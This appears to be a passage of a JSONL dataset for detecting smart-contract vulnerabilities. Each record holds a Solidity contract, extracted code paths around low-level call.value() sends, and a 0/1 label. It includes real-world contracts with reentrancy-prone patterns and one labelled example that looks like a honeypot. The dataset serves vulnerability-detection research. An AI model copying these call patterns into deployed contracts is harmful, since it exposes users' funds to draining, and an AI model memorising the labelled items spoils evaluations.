require(!confirmations[transactionId][owner]); _; } modifier notExecuted(uint transactionId) { require(!transactions[transactionId].executed); _; } modifier notNull(address _address) { require(_address != 0); _; } modifier validRequirement(uint ownerCount, uint _required) { require(ownerCount <= MAX_OWNER_COUNT && _required <= ownerCount && _required != 0 && ownerCount != 0); _; } function() payable { if (msg.value > 0) Deposit(msg.sender, msg.value); } function MultiSigWallet(address[] _owners, uint _required) public validRequirement(_owners.length, _required) { for (uint i=0; i<_owners.length; i++) { require(!isOwner[_owners[i]] && _owners[i] != 0); isOwner[_owners[i]] = true; } owners = _owners; required = _required; } function addOwner(address owner) public onlyWallet ownerDoesNotExist(owner) notNull(owner) validRequirement(owners.length + 1, required) { isOwner[owner] = true; owners.push(owner); OwnerAddition(owner); } function removeOwner(address owner) public onlyWallet ownerExists(owner) { isOwner[owner] = false; for (uint i=0; i<owners.length - 1; i++) if (owners[i] == owner) { owners[i] = owners[owners.length - 1]; break; } owners.length -= 1; if (required > owners.length) changeRequirement(owners.length); OwnerRemoval(owner); } function replaceOwner(address owner, address newOwner) public onlyWallet ownerExists(owner) ownerDoesNotExist(newOwner) { for (uint i=0; i<owners.length; i++) if (owners[i] == owner) { owners[i] = newOwner; break; } isOwner[owner] = false; isOwner[newOwner] = true; OwnerRemoval(owner); OwnerAddition(newOwner); } function changeRequirement(uint _required) public onlyWallet validRequirement(owners.length, _required) { required = _required; RequirementChange(_required); } function submitTransaction(address destination, uint value, bytes data) public returns (uint transactionId) { transactionId = addTransaction(destination, value, data); confirmTransaction(transactionId); } function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); } function revokeConfirmation(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) { confirmations[transactionId][msg.sender] = false; Revocation(msg.sender, transactionId); } function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; } } } function isConfirmed(uint transactionId) public constant returns (bool) { uint count = 0; for (uint i=0; i<owners.length; i++) { if (confirmations[transactionId][owners[i]]) count += 1; if (count == required) return true; } } function addTransaction(address destination, uint value, bytes data) internal notNull(destination) returns (uint transactionId) { transactionId = transactionCount; transactions[transactionId] = Transaction({ destination: destination, value: value, data: data, executed: false }); transactionCount += 1; Submission(transactionId); } function getConfirmationCount(uint transactionId) public constant returns (uint count) { for (uint i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) count += 1; } function getTransactionCount(bool pending, bool executed) public constant returns (uint count) { for (uint i=0; i<transactionCount; i++) if (   pending && !transactions[i].executed || executed && transactions[i].executed) count += 1; } function getOwners() public constant returns (address[]) { return owners; } function getConfirmations(uint transactionId) public constant returns (address[] _confirmations) { address[] memory confirmationsTemp = new address[](owners.length); uint count = 0; uint i; for (i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) { confirmationsTemp[count] = owners[i]; count += 1; } _confirmations = new address[](count); for (i=0; i<count; i++) _confirmations[i] = confirmationsTemp[i]; } function getTransactionIds(uint from, uint to, bool pending, bool executed) public constant returns (uint[] _transactionIds) { uint[] memory transactionIdsTemp = new uint[](transactionCount); uint count = 0; uint i; for (i=0; i<transactionCount; i++) if (   pending && !transactions[i].executed || executed && transactions[i].executed) { transactionIdsTemp[count] = i; count += 1; } _transactionIds = new uint[](to - from); for (i=from; i<to; i++) _transactionIds[i - from] = transactionIdsTemp[i]; } } "}
{"sol name": "18438.sol", "label": 0, "first path": "function invest() public { uint256 amountToSend = address(this).balance; if(amountToSend > 1){ uint256 half = amountToSend / 2; require(sk2xContract.call.value(half)()); p3dContract.buy.value(half)(msg.sender); function donate() payable public { require(sk2xContract.call.value(msg.value).gas(1000000)()); ", "second path": "function invest() public { uint256 amountToSend = address(this).balance; if(amountToSend > 1){ uint256 half = amountToSend / 2; require(sk2xContract.call.value(half)()); p3dContract.buy.value(half)(msg.sender); function donate() payable public { require(sk2xContract.call.value(msg.value).gas(1000000)()); ", "third path": "function invest() public { uint256 amountToSend = address(this).balance; if(amountToSend > 1){ uint256 half = amountToSend / 2; require(sk2xContract.call.value(half)()); p3dContract.buy.value(half)(msg.sender); function donate() payable public { require(sk2xContract.call.value(msg.value).gas(1000000)()); ", "long path": "pragma solidity ^0.4.21; contract ERC20Interface { function totalSupply() public constant returns (uint256); function balanceOf(address tokenOwner) public constant returns (uint256 balance); function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining); function transfer(address to, uint256 tokens) public returns (bool success); function approve(address spender, uint256 tokens) public returns (bool success); function transferFrom(address from, address to, uint256 tokens) public returns (bool success); event Transfer(address indexed from, address indexed to, uint tokens); event Approval(address indexed tokenOwner, address indexed spender, uint tokens); } contract P3D { function withdraw() public; function buy(address) public payable returns(uint256); } contract Owned { address public owner; address public ownerCandidate; function Owned() public { owner = msg.sender; } modifier onlyOwner { require(msg.sender == owner); _; } function changeOwner(address _newOwner) public onlyOwner { ownerCandidate = _newOwner; } function acceptOwnership() public { require(msg.sender == ownerCandidate); owner = ownerCandidate; } } contract BoomerangLiquidity is Owned { modifier onlyOwner(){ require(msg.sender == owner); _; } P3D internal constant p3dContract = P3D(address(0xB3775fB83F7D12A36E0475aBdD1FCA35c091efBe)); address internal constant sk2xContract = address(0xAfd87E1E1eCe09D18f4834F64F63502718d1b3d4); function() payable public { invest(); } function invest() public { uint256 amountToSend = address(this).balance; if(amountToSend > 1){ uint256 half = amountToSend / 2; require(sk2xContract.call.value(half)()); p3dContract.buy.value(half)(msg.sender); } } function withdraw(address token) public { P3D(token).withdraw.gas(1000000)(); invest(); } function withdraw() public { p3dContract.withdraw.gas(1000000)(); invest(); } function withdrawAndSend() public { p3dContract.withdraw.gas(1000000)(); invest(); } function donate() payable public { require(sk2xContract.call.value(msg.value).gas(1000000)()); } function donateToken(address token) payable public { P3D(token).buy.value(msg.value).gas(1000000)(msg.sender); } function donateP3D() payable public { p3dContract.buy.value(msg.value).gas(1000000)(msg.sender); } } "}
{"sol name": "14758.sol", "label": 0, "first path": "function wcf(address target, uint256 a) payable { require(msg.sender == owner); uint startBalance = this.balance; target.call.value(msg.value)(bytes4(keccak256(\"play(uint256)\")), a); if (this.balance <= startBalance) revert(); owner.transfer(this.balance); ", "second path": "function wcf(address target, uint256 a) payable { require(msg.sender == owner); uint startBalance = this.balance; target.call.value(msg.value)(bytes4(keccak256(\"play(uint256)\")), a); if (this.balance <= startBalance) revert(); owner.transfer(this.balance); ", "third path": "function wcf(address target, uint256 a) payable { require(msg.sender == owner); uint startBalance = this.balance; target.call.value(msg.value)(bytes4(keccak256(\"play(uint256)\")), a); if (this.balance <= startBalance) revert(); owner.transfer(this.balance); ", "long path": "pragma solidity ^0.4.11; contract Owned { address owner; function Owned() { owner = msg.sender; } function kill() { if (msg.sender == owner) suicide(owner); } } contract Wforcer is Owned { function wcf(address target, uint256 a) payable { require(msg.sender == owner); uint startBalance = this.balance; target.call.value(msg.value)(bytes4(keccak256(\"play(uint256)\")), a); if (this.balance <= startBalance) revert(); owner.transfer(this.balance); } function withdraw() { require(msg.sender == owner); require(this.balance > 0); owner.transfer(this.balance); } function () payable {} } "}
{"sol name": "14994.sol", "label": 0, "first path": "function collectOwedDividends() public returns (uint _amount) { _updateCreditedPoints(msg.sender); _amount = creditedPoints[msg.sender] / POINTS_PER_WEI; creditedPoints[msg.sender] = 0; dividendsCollected += _amount; emit CollectedDividends(now, msg.sender, _amount); require(msg.sender.call.value(_amount)()); ", "second path": "function collectOwedDividends() public returns (uint _amount) { _updateCreditedPoints(msg.sender); _amount = creditedPoints[msg.sender] / POINTS_PER_WEI; creditedPoints[msg.sender] = 0; dividendsCollected += _amount; emit CollectedDividends(now, msg.sender, _amount); require(msg.sender.call.value(_amount)()); ", "third path": "function collectOwedDividends() public returns (uint _amount) { _updateCreditedPoints(msg.sender); _amount = creditedPoints[msg.sender] / POINTS_PER_WEI; creditedPoints[msg.sender] = 0; dividendsCollected += _amount; emit CollectedDividends(now, msg.sender, _amount); require(msg.sender.call.value(_amount)()); ", "long path": "pragma solidity ^0.4.23; contract ERC20 { string public name; string public symbol; uint8 public decimals = 18; uint public totalSupply; mapping (address => uint) public balanceOf; mapping (address => mapping (address => uint)) public allowance; event Created(uint time); event Transfer(address indexed from, address indexed to, uint amount); event Approval(address indexed owner, address indexed spender, uint amount); event AllowanceUsed(address indexed owner, address indexed spender, uint amount); constructor(string _name, string _symbol) public { name = _name; symbol = _symbol; emit Created(now); } function transfer(address _to, uint _value) public returns (bool success) { return _transfer(msg.sender, _to, _value); } function approve(address _spender, uint _value) public returns (bool success) { allowance[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { address _spender = msg.sender; require(allowance[_from][_spender] >= _value); allowance[_from][_spender] -= _value; emit AllowanceUsed(_from, _spender, _value); return _transfer(_from, _to, _value); } function _transfer(address _from, address _to, uint _value) private returns (bool success) { require(balanceOf[_from] >= _value); require(balanceOf[_to] + _value > balanceOf[_to]); balanceOf[_from] -= _value; balanceOf[_to] += _value; emit Transfer(_from, _to, _value); return true; } } interface HasTokenFallback { function tokenFallback(address _from, uint256 _amount, bytes _data) external returns (bool success); } contract ERC667 is ERC20 { constructor(string _name, string _symbol) public ERC20(_name, _symbol) {} function transferAndCall(address _to, uint _value, bytes _data) public returns (bool success) { require(super.transfer(_to, _value)); require(HasTokenFallback(_to).tokenFallback(msg.sender, _value, _data)); return true; } } contract DividendToken is ERC667 { bool public isFrozen; address public comptroller = msg.sender; modifier onlyComptroller(){ require(msg.sender==comptroller); _; } uint constant POINTS_PER_WEI = 1e32; uint public dividendsTotal; uint public dividendsCollected; uint public totalPointsPerToken; uint public totalBurned; mapping (address => uint) public creditedPoints; mapping (address => uint) public lastPointsPerToken; event Frozen(uint time); event UnFrozen(uint time); event TokensMinted(uint time, address indexed account, uint amount, uint newTotalSupply); event TokensBurned(uint time, address indexed account, uint amount, uint newTotalSupply); event CollectedDividends(uint time, address indexed account, uint amount); event DividendReceived(uint time, address indexed sender, uint amount); constructor(string _name, string _symbol) public ERC667(_name, _symbol) {} function () payable public { if (msg.value == 0) return; totalPointsPerToken += (msg.value * POINTS_PER_WEI) / totalSupply; dividendsTotal += msg.value; emit DividendReceived(now, msg.sender, msg.value); } function mint(address _to, uint _amount) onlyComptroller public { _updateCreditedPoints(_to); totalSupply += _amount; balanceOf[_to] += _amount; emit TokensMinted(now, _to, _amount, totalSupply); } function burn(address _account, uint _amount) onlyComptroller public { require(balanceOf[_account] >= _amount); _updateCreditedPoints(_account); balanceOf[_account] -= _amount; totalSupply -= _amount; totalBurned += _amount; emit TokensBurned(now, _account, _amount, totalSupply); } function freeze(bool _isFrozen) onlyComptroller public { if (isFrozen == _isFrozen) return; isFrozen = _isFrozen; if (_isFrozen) emit Frozen(now); else emit UnFrozen(now); } function transfer(address _to, uint _value) public returns (bool success) { require(!isFrozen); _updateCreditedPoints(msg.sender); _updateCreditedPoints(_to); return ERC20.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { require(!isFrozen); _updateCreditedPoints(_from); _updateCreditedPoints(_to); return ERC20.transferFrom(_from, _to, _value); } function transferAndCall(address _to, uint _value, bytes _data) public returns (bool success) { require(!isFrozen); _updateCreditedPoints(msg.sender); _updateCreditedPoints(_to); return ERC667.transferAndCall(_to, _value, _data); } function collectOwedDividends() public returns (uint _amount) { _updateCreditedPoints(msg.sender); _amount = creditedPoints[msg.sender] / POINTS_PER_WEI; creditedPoints[msg.sender] = 0; dividendsCollected += _amount; emit CollectedDividends(now, msg.sender, _amount); require(msg.sender.call.value(_amount)()); } function _updateCreditedPoints(address _account) private { creditedPoints[_account] += _getUncreditedPoints(_account); lastPointsPerToken[_account] = totalPointsPerToken; } function _getUncreditedPoints(address _account) private view returns (uint _amount) { uint _pointsPerToken = totalPointsPerToken - lastPointsPerToken[_account]; return _pointsPerToken * balanceOf[_account]; } function getOwedDividends(address _account) public constant returns (uint _amount) { return (_getUncreditedPoints(_account) + creditedPoints[_account])/POINTS_PER_WEI; } } "}
{"sol name": "35806.sol", "label": 0, "first path": "function withdraw(uint amount) { require(tokens[0][msg.sender] >= amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount); require(msg.sender.call.value(amount)()); Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); ", "second path": "function withdraw(uint amount) { require(tokens[0][msg.sender] >= amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount); require(msg.sender.call.value(amount)()); Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); ", "third path": "function withdraw(uint amount) { require(tokens[0][msg.sender] >= amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount); require(msg.sender.call.value(amount)()); Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); ", "long path": "pragma solidity ^0.4.15; contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } } contract Token { function totalSupply() constant returns (uint256 supply) {} function balanceOf(address _owner) constant returns (uint256 balance) {} function transfer(address _to, uint256 _value) returns (bool success) {} function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} function approve(address _spender, uint256 _value) returns (bool success) {} function allowance(address _owner, address _spender) constant returns (uint256 remaining) {} event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); uint public decimals; string public name; } contract TokenLab is SafeMath { address public admin; address public feeAccount; uint public feeMake; uint public feeTake; mapping (address => mapping (address => uint)) public tokens; mapping (address => mapping (bytes32 => bool)) public orders; mapping (address => mapping (bytes32 => uint)) public orderFills; event Order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user); event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s); event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give); event Deposit(address token, address user, uint amount, uint balance); event Withdraw(address token, address user, uint amount, uint balance); function TokenLab(address feeAccount_, uint feeMake_, uint feeTake_) { admin = msg.sender; feeAccount = feeAccount_; feeMake = feeMake_; feeTake = feeTake_; } modifier onlyAdmin () { require(msg.sender == admin); _; } function changeAdmin(address admin_) onlyAdmin { admin = admin_; } function changeFeeAccount(address feeAccount_) onlyAdmin { feeAccount = feeAccount_; } function changeFeeMake(uint feeMake_) onlyAdmin { require (feeMake_ <= feeMake); feeMake = feeMake_; } function changeFeeTake(uint feeTake_) onlyAdmin { require (feeTake_ <= feeTake); feeTake = feeTake_; } function deposit() payable { tokens[0][msg.sender] = safeAdd(tokens[0][msg.sender], msg.value); Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]); } function withdraw(uint amount) { require(tokens[0][msg.sender] >= amount); tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount); require(msg.sender.call.value(amount)()); Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); } function depositToken(address token, uint amount) { require (token!=0); require (Token(token).transferFrom(msg.sender, this, amount)); tokens[token][msg.sender] = safeAdd(tokens[token][msg.sender], amount); Deposit(token, msg.sender, amount, tokens[token][msg.sender]); } function withdrawToken(address token, uint amount) { require (token!=0); require (tokens[token][msg.sender] >= amount); tokens[token][msg.sender] = safeSub(tokens[token][msg.sender], amount); require (Token(token).transfer(msg.sender, amount)); Withdraw(token, msg.sender, amount, tokens[token][msg.sender]); } function balanceOf(address token, address user) constant returns (uint) { return tokens[token][user]; } function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce) { bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce); orders[msg.sender][hash] = true; Order(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender); } function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) { bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce); require (( (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) && block.number <= expires && safeAdd(orderFills[user][hash], amount) <= amountGet )); tradeBalances(tokenGet, amountGet, tokenGive, amountGive, user, amount); orderFills[user][hash] = safeAdd(orderFills[user][hash], amount); Trade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender); } function tradeBalances(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address user, uint amount) private { uint feeMakeXfer = safeMul(amount, feeMake) / (1 ether); uint feeTakeXfer = safeMul(amount, feeTake) / (1 ether); tokens[tokenGet][msg.sender] = safeSub(tokens[tokenGet][msg.sender], safeAdd(amount, feeTakeXfer)); tokens[tokenGet][user] = safeAdd(tokens[tokenGet][user], safeSub(amount, feeMakeXfer)); tokens[tokenGet][feeAccount] = safeAdd(tokens[tokenGet][feeAccount], safeAdd(feeMakeXfer, feeTakeXfer)); tokens[tokenGive][user] = safeSub(tokens[tokenGive][user], safeMul(amountGive, amount) / amountGet); tokens[tokenGive][msg.sender] = safeAdd(tokens[tokenGive][msg.sender], safeMul(amountGive, amount) / amountGet); } function testTrade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount, address sender) constant returns(bool) { if (!( tokens[tokenGet][sender] >= amount && availableVolume(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, user, v, r, s) >= amount )) return false; return true; } function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) { bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce); if (!( (orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) && block.number <= expires )) return 0; uint available1 = safeSub(amountGet, orderFills[user][hash]); uint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive; if (available1<available2) return available1; return available2; } function amountFilled(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user) constant returns(uint) { bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce); return orderFills[user][hash]; } function cancelOrder(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s) { bytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce); require ((orders[msg.sender][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == msg.sender)); orderFills[msg.sender][hash] = amountGet; Cancel(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender, v, r, s); } } "}
{"sol name": "40241.sol", "label": 0, "first path": "function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); ", "second path": "function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); ", "third path": "function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); ", "long path": "contract AbstractDaoChallenge { function isMember (DaoAccount account, address allegedOwnerAddress) returns (bool); } contract DaoAccount { uint256 tokenBalance; address owner; address daoChallenge; uint256 tokenPrice; address challengeOwner; modifier noEther() {if (msg.value > 0) throw; _;} modifier onlyOwner() {if (owner != msg.sender) throw; _;} modifier onlyDaoChallenge() {if (daoChallenge != msg.sender) throw; _;} modifier onlyChallengeOwner() {if (challengeOwner != msg.sender) throw; _;} function DaoAccount (address _owner, uint256 _tokenPrice, address _challengeOwner) noEther { owner = _owner; tokenPrice = _tokenPrice; daoChallenge = msg.sender; tokenBalance = 0; challengeOwner = _challengeOwner; } function () { throw; } function getOwnerAddress() constant returns (address ownerAddress) { return owner; } function getTokenBalance() constant returns (uint256 tokens) { return tokenBalance; } function buyTokens() onlyDaoChallenge returns (uint256 tokens) { uint256 amount = msg.value; if (amount == 0) throw; if (amount % tokenPrice != 0) throw; tokens = amount / tokenPrice; tokenBalance += tokens; return tokens; } function withdraw(uint256 tokens) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; if(!owner.call.value(tokens * tokenPrice)()) throw; } function transfer(uint256 tokens, DaoAccount recipient) noEther onlyDaoChallenge { if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw; tokenBalance -= tokens; recipient.receiveTokens.value(tokens * tokenPrice)(tokens); } function receiveTokens(uint256 tokens) { DaoAccount sender = DaoAccount(msg.sender); if (!AbstractDaoChallenge(daoChallenge).isMember(sender, sender.getOwnerAddress())) throw; uint256 amount = msg.value; if (amount == 0) throw; if (amount / tokenPrice != tokens) throw; tokenBalance += tokens; } function terminate() noEther onlyChallengeOwner { suicide(challengeOwner); } } contract DaoChallenge { event notifyTerminate(uint256 finalBalance); event notifyTokenIssued(uint256 n, uint256 price, uint deadline); event notifyNewAccount(address owner, address account); event notifyBuyToken(address owner, uint256 tokens, uint256 price); event notifyWithdraw(address owner, uint256 tokens); event notifyTransfer(address owner, address recipient, uint256 tokens); uint public tokenIssueDeadline = now; uint256 public tokensIssued = 0; uint256 public tokensToIssue = 0; uint256 public tokenPrice = 1000000000000000; mapping (address => DaoAccount) public daoAccounts; address challengeOwner; modifier noEther() {if (msg.value > 0) throw; _;} modifier onlyChallengeOwner() {if (challengeOwner != msg.sender) throw; _;} function DaoChallenge () { challengeOwner = msg.sender; } function () noEther { } function accountFor (address accountOwner, bool createNew) private returns (DaoAccount) { DaoAccount account = daoAccounts[accountOwner]; if(account == DaoAccount(0x00) && createNew) { account = new DaoAccount(accountOwner, tokenPrice, challengeOwner); daoAccounts[accountOwner] = account; notifyNewAccount(accountOwner, address(account)); } return account; } function createAccount () { accountFor(msg.sender, true); } function isMember (DaoAccount account, address allegedOwnerAddress) returns (bool) { if (account == DaoAccount(0x00)) return false; if (allegedOwnerAddress == 0x00) return false; if (daoAccounts[allegedOwnerAddress] == DaoAccount(0x00)) return false; if (daoAccounts[allegedOwnerAddress] != account) return false; return true; } function getTokenBalance () constant noEther returns (uint256 tokens) { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) return 0; return account.getTokenBalance(); } function issueTokens (uint256 n, uint256 price, uint deadline) noEther onlyChallengeOwner { if (now < tokenIssueDeadline) throw; if (deadline < now) throw; if (n == 0) throw; tokenPrice = price * 1000000000000; tokenIssueDeadline = deadline; tokensToIssue = n; tokensIssued = 0; notifyTokenIssued(n, price, deadline); } function buyTokens () returns (uint256 tokens) { tokens = msg.value / tokenPrice; if (now > tokenIssueDeadline) throw; if (tokensIssued >= tokensToIssue) throw; tokensIssued += tokens; if (tokensIssued > tokensToIssue) throw; DaoAccount account = accountFor(msg.sender, true); if (account.buyTokens.value(msg.value)() != tokens) throw; notifyBuyToken(msg.sender, tokens, msg.value); return tokens; } function withdraw(uint256 tokens) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; account.withdraw(tokens); notifyWithdraw(msg.sender, tokens); } function transfer(uint256 tokens, address recipient) noEther { DaoAccount account = accountFor(msg.sender, false); if (account == DaoAccount(0x00)) throw; DaoAccount recipientAcc = accountFor(recipient, false); if (recipientAcc == DaoAccount(0x00)) throw; account.transfer(tokens, recipientAcc); notifyTransfer(msg.sender, recipient, tokens); } function terminate() noEther onlyChallengeOwner { notifyTerminate(this.balance); suicide(challengeOwner); } } "}
{"sol name": "21697.sol", "label": 1, "first path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "second path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "third path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "long path": "pragma solidity ^0.4.19; contract SPRING_BOARD_1_ETH { address owner = msg.sender; function() public payable {} function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); } } function Kill()    public    payable    { if(msg.sender==owner)        { selfdestruct(owner); } } } "}
{"sol name": "10107.sol", "label": 0, "first path": "function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) { if(balanceOf(msg.sender) < value) revert(); balances[msg.sender] = balances[msg.sender].sub(value); balances[to] = balances[to].add(value); if (isContract(to)) { assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data)); emit Transfer(msg.sender, to, value, data); return true; ", "second path": "function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) { if(balanceOf(msg.sender) < value) revert(); balances[msg.sender] = balances[msg.sender].sub(value); balances[to] = balances[to].add(value); if (isContract(to)) { assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data)); emit Transfer(msg.sender, to, value, data); return true; ", "third path": "function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) { if(balanceOf(msg.sender) < value) revert(); balances[msg.sender] = balances[msg.sender].sub(value); balances[to] = balances[to].add(value); if (isContract(to)) { assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data)); emit Transfer(msg.sender, to, value, data); return true; ", "long path": "pragma solidity ^0.4.0; contract ERC223 { function balanceOf(address owner) public view returns (uint); function name() public view returns (string); function symbol() public view returns (string); function decimals() public view returns (uint8); function totalSupply() public view returns (uint); function transfer(address to, uint value) public returns (bool success); function transfer(address to, uint value, bytes data) public returns (bool success); function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success); event Transfer(address indexed from, address indexed to, uint indexed value, bytes data); } contract ERC223ReceivingContract { function tokenFallback(address from, uint value, bytes data) public; } library SafeMath {function mul(uint a, uint b) internal pure returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint a, uint b) internal pure returns (uint) { uint c = a / b; return c; } function sub(uint a, uint b) internal pure returns (uint) { assert(b <= a); return a - b; } function add(uint a, uint b) internal pure returns (uint) { uint c = a + b; assert(c >= a); return c; } function max64(uint64 a, uint64 b) internal pure returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal pure returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal pure returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal pure returns (uint256) { return a < b ? a : b; } } contract MyToken is ERC223 { using SafeMath for uint; mapping(address => uint) balances; string public name; string public symbol; uint8 public decimals; uint public totalSupply; constructor(string _name, string _symbol, uint8 _decimals, uint _totalSupply) public { name = _name; symbol = _symbol; decimals = _decimals; totalSupply = _totalSupply; balances[msg.sender] = _totalSupply; } function name() public view returns (string) { return name; } function symbol() public view returns (string) { return symbol; } function decimals() public view returns (uint8) { return decimals; } function totalSupply() public view returns (uint) { return totalSupply; } function balanceOf(address owner) public view returns (uint) { return balances[owner]; } function transfer(address to, uint value, bytes data) public returns (bool) { if(balanceOf(msg.sender) < value) revert(); balances[msg.sender] = balances[msg.sender].sub(value); balances[to] = balances[to].add(value); if(isContract(to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(to); receiver.tokenFallback(msg.sender, value, data); } emit Transfer(msg.sender, to, value, data); return true; } function transfer(address to, uint value) public returns (bool) { if(balanceOf(msg.sender) < value) revert(); bytes memory empty; balances[msg.sender] = balances[msg.sender].sub(value); balances[to] = balances[to].add(value); if(isContract(to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(to); receiver.tokenFallback(msg.sender, value, empty); } emit Transfer(msg.sender, to, value, empty); return true; } function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) { if(balanceOf(msg.sender) < value) revert(); balances[msg.sender] = balances[msg.sender].sub(value); balances[to] = balances[to].add(value); if (isContract(to)) { assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data)); } emit Transfer(msg.sender, to, value, data); return true; } function isContract(address addr) private view returns (bool) { uint len; assembly { len := extcodesize(addr) } return (len > 0); } } "}
